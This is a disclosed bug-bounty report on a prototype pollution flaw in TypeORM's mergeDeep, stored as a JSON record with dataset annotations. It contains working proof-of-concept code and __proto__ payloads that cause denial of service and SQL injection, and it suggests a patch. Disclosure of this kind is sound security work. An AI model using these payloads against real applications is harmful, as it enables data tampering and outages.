{
  "reported_to": "Node.js third-party modules",
  "reported_by": "phra ",
  "title": "SQL Injection or Denial of Service due to a Prototype Pollution",
  "content": "\nI would like to report a prototype pollution vulnerability in the typeorm package.\nIt allows an attacker that is able to save a specially crafted object to pollute the Object prototype and cause side effects on the library/application logic, such as denials of service attacks and/or SQL injections, by adding arbitrary properties to any object in the runtime. If the end application depending on the library has dynamic code evaluation or command execution gadgets, the attacker can potentially trigger arbitrary command execution on the target machine.\nModule\nmodule name: TypeORM\nversion: v0.2.24, latest\nnpm page: https://www.npmjs.com/package/typeorm\nModule Description\nTypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.\nModule Stats\n[1] weekly downloads: 385,403\nVulnerability\nVulnerability Description\nThe vulnerability was found after a source code review of the library on GitHub. In particular, the following snippet of code can be found in OrmUtils.ts:\nhttps://github.com/typeorm/typeorm/blob/e92c743fb54fc404658fcaf2254861b6aa63bd98/src/util/OrmUtils.ts#L66\nCode 1020 Bytes\n1/**\n2 * Deep Object.assign.\n3 *\n4 * @see http://stackoverflow.com/a/34749873\n5 */\n6function mergeDeep(target, ...sources) {\n7    if (!sources.length) return target;\n8    const source = sources.shift();\n9\n10    if (isObject(target) && isObject(source)) {\n11        for (const key in source) {\n12            const value = source[key];\n13            if (value instanceof Promise)\n14                continue;\n15\n16            if (isObject(value)\n17                && !(value instanceof Map)\n18                && !(value instanceof Set)\n19                && !(value instanceof Date)\n20                && !(value instanceof Buffer)\n21                && !(value instanceof RegExp)\n22                && !(value instanceof URL)) {\n23                if (!target[key])\n24                    Object.assign(target, { [key]: Object.create(Object.getPrototypeOf(value)) });\n25                mergeDeep(target[key], value);\n26            } else {\n27                Object.assign(target, { [key]: value });\n28            }\n29        }\n30    }\n31\n32    return mergeDeep(target, ...sources);\n33}\nThe mentioned function, as we can see from the code, doesn't account for built-in properties such as __proto__, causing pollution of the Object prototype when a specially crafted object is passed in the rest argument ...sources.\nSteps To Reproduce:\nTo test if the function is vulnerable we can run the following proof of concept to confirm that in some situations we can control at least one element in the rest argument and we can trigger the pollution of Object prototype with arbitrary properties.\npollution.js\nCode 1.22 KiB\n1function isObject(item) {\n2    return (item && typeof item === \"object\" && !Array.isArray(item));\n3}\n4\n5/**\n6 * Deep Object.assign.\n7 *\n8 * @see http://stackoverflow.com/a/34749873\n9 */\n10function mergeDeep(target, ...sources) {\n11    if (!sources.length) return target;\n12    const source = sources.shift();\n13\n14    if (isObject(target) && isObject(source)) {\n15        for (const key in source) {\n16            const value = source[key];\n17            if (value instanceof Promise)\n18                continue;\n19\n20            if (isObject(value)\n21                && !(value instanceof Map)\n22                && !(value instanceof Set)\n23                && !(value instanceof Date)\n24                && !(value instanceof Buffer)\n25                && !(value instanceof RegExp)\n26                && !(value instanceof URL)) {\n27                if (!target[key])\n28                    Object.assign(target, { [key]: Object.create(Object.getPrototypeOf(value)) });\n29                mergeDeep(target[key], value);\n30            } else {\n31                Object.assign(target, { [key]: value });\n32            }\n33        }\n34    }\n35\n36    return mergeDeep(target, ...sources);\n37}\n38\n39const a = {}\n40const b = JSON.parse(`{\"__proto__\":{\"polluted\":true}}`)\n41\n42mergeDeep(a, b)\n43console.log(`pwned: ${({}).polluted}`)\nExploitation\nBy naively exploiting the vulnerability, we can cause a denial of service in the running application, for example by causing a loop in the prototype chain as in the following payload:\nCode 77 Bytes\n1const post = JSON.parse(`{\"text\":\"a\",\"title\":{\"__proto__\":{\"polluted\":{}}}}`)\nAn SQL injection can be triggered with the following payload, that will add an arbitary WHERE clause to any following query:\nCode 108 Bytes\n1const post = JSON.parse(`{\"text\":\"a\",\"title\":{\"__proto__\":{\"where\":{\"name\":\"sqlinjection\",\"where\":null}}}}`)\nA complete proof of concept that can trigger a SQL injection by only depending on the library code is reported here:\n(based on https://github.com/typeorm/typescript-example)\nsqli.ts\nCode 1.44 KiB\n1import { createConnection, getConnection } from \"typeorm\";\n2import { Post } from \"./entity/Post\";\n3import { Category } from \"./entity/Category\";\n4\n5async function cleanUp() {\n6    await createConnection(\"mongo\")\n7    await createConnection(\"mysql\")\n8    const mongoConnection = getConnection(\"mongo\")\n9    const mysqlConnection = getConnection(\"mysql\")\n10    await mongoConnection.dropDatabase()\n11    await mysqlConnection.dropDatabase()\n12    await mongoConnection.close()\n13    await mysqlConnection.close()\n14}\n15\n16async function main() {\n17    await cleanUp()\n18    await createConnection(\"mongo\")\n19    await createConnection(\"mysql\")\n20    const mongoConnection = getConnection(\"mongo\")\n21    const mysqlConnection = getConnection(\"mysql\")\n22\n23    const post = JSON.parse(`{\"text\":\"a\",\"title\":{\"__proto__\":{\"where\":{\"name\":\"sqlinjection\",\"where\":null}}}}`)\n24\n25    try {\n26        await mongoConnection.manager.save(Post, post)\n27        console.log(\"Post has been saved: \", post)\n28        const saved = await mongoConnection.manager.find(Post)\n29        console.log(\"Posts were found: \", saved)\n30    } catch (err) {\n31        console.error(err)\n32        const category = new Category()\n33        category.name = 'category'\n34        await mysqlConnection.manager.save(Category, category)\n35        const categories = await mysqlConnection.manager.find(Category, {}) // WHERE name = \"sqlinjection\"\n36        console.log(\"Categories were found: \", categories)\n37    }\n38}\n39\n40main().catch(error => console.log(\"Error: \", error))\nPatch\nThe function mergeDeep has to account for prototype pollution attacks by skipping built-in properties such as __proto__. (e.g. https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b)\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nHunter's comments and funny memes go here\nhttps://imgflip.com/i/40r9dg\nImpact\nAn attacker can achieve denials of service attacks and/or alter the application logic to cause SQL injections by only depending on the library code. If any useful gadget to trigger an arbitrary code/command execution is also available in the end-user application and the path can be reached with user interaction, the attacker can also achieve arbitrary command execution on the target system.\n\n",
  "severity": [
    9.9,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1595625600,
  "report_url": "https://hackerone.com/reports/869574",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a malicious object with prototype pollution (e.g., using __proto__ to inject properties)"
    ],
    [
      2,
      "Pass the malicious object to TypeORM's mergeDeep function (either directly or through a save operation)"
    ]
  ],
  "vuln_description": "The vulnerability is a prototype pollution in TypeORM's mergeDeep function, which fails to properly handle built-in properties like __proto__. This allows attackers to modify the Object prototype, potentially leading to SQL injection or denial of service by altering application logic.",
  "reason": "The vulnerability involves understanding prototype pollution concepts and identifying a specific unsafe merge function in a popular ORM library. While the core issue (prototype pollution) is well-known, discovering its impact on TypeORM's query building logic requires deeper analysis of the library's internals.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves prototype pollution in the TypeORM library, which is a server-side issue related to object manipulation and not directly tied to authentication or authorization boundaries that would be detected by the described methodologies. The methodologies focus on testing user sessions and resource access patterns, not deep object manipulation or library-specific vulnerabilities.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves prototype pollution through unsafe deep merging logic in TypeORM's ORM utility functions. This class of vulnerability requires analysis of library code handling object prototypes rather than HTTP parameter injection. The proposed methodology focuses on HTTP request/response analysis and simple payload injection in web parameters, which would not detect this server-side prototype pollution vulnerability since:\n1. It originates from unsafe object merging in TypeORM's internal logic\n2. Exploitation requires sending specially crafted object structures rather than HTTP parameter payloads\n3. The vulnerable code path isn't directly exposed as a web endpoint parameter\n4. Impact manifests through prototype chain pollution rather than direct response manipulation",
    "is_simple_injection": false
  }
}